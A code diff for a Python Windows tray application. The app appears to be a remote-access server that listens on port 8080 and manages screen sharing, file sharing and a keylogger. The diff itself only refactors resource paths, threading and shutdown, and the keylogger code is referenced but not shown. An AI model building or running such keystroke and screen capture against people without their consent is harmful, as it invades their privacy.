@@ -11,17 +11,26 @@ from ShareFile import ShareFile
 from ServerIO import ServerIO
 from ctypes import windll
 import threading
-
 import itertools
 import glob
 import sys
 import socket
 import os
 import signal
+import time
 
 HOST = ""
 PORT = 8080
 ADDR = (HOST, PORT)
+
+
+def resource_path(relative_path):
+    try:
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.dirname(os.path.realpath(__file__))
+
+    return os.path.join(base_path, relative_path)
 
 
 class ServerApp:
@@ -43,7 +52,7 @@ class ServerApp:
     def setup(self):
         self.running = True
         icons = itertools.cycle(
-            glob.glob(os.path.dirname(os.path.realpath(__file__)) + "/*.ico")
+            glob.glob(resource_path("*.ico"))
         )
         SysTrayIcon(
             next(icons),
@@ -73,8 +82,7 @@ class ServerApp:
 
     def start_listening(self, sysTrayIcon):
         while self.running:
-            self.thread = threading.Thread(target=self.server_io.start_listening)
-            self.thread.start()
+            threading.Thread(target=self.server_io.start_listening, daemon=True).start()
             addr = self.server.accept()
             sysTrayIcon.hover_text = "Connected by " + addr
             sysTrayIcon.refresh_icon()
@@ -118,21 +126,15 @@ class ServerApp:
             self.screen.close_screen_share()
             self.key_logger.stop()
             self.server_io.close()
-            self.thread.join()
             self.server.close()
         except:
             pass
 
 if __name__ == "__main__":
-    def resource_path(relative_path):
-        try:
-            base_path = sys._MEIPASS
-        except Exception:
-            base_path = os.path.abspath(".")
+    ServerApp()
 
-        return os.path.join(base_path, relative_path)
-
-    Logo = resource_path("favicon.ico")
-
-    a = ServerApp()
+    for i in range(5):
+        time.sleep(1)
+        if len(threading.enumerate()) == 1:
+            break
     os.kill(os.getpid(), signal.SIGINT)
